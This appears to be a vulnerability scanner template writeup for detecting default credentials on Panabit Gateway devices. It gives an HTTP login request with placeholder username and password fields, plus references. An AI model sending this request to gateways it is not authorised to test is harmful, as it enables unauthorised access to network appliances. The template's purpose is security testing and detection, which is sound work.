# Nuclei Template: Panabit Gateway - Default Login
**Template ID:** panabit-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** Critical
**CWE:** CWE-1391
**Source:** Nuclei Template (`panabit-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Panabit Gateway default credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login/userverify.cgi HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAjZMsILtbrBp8VbC
Referer: {{BaseURL}}/login/login.htm
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

------WebKitFormBoundaryAjZMsILtbrBp8VbC
Content-Disposition: form-data; name="username"

{{username}}
------WebKitFormBoundaryAjZMsILtbrBp8VbC
Content-Disposition: form-data; name="password"

{{password}}
------WebKitFormBoundaryAjZMsILtbrBp8VbC--
```

## References
- https://max.book118.com/html/2017/0623/117514590.shtm
- https://en.panabit.com/wp-content/uploads/Panabit-Intelligent-Application-Gateway-04072020.pdf
- https://topic.alibabacloud.com/a/panabit-monitoring-installation-tutorial_8_8_20054193.html
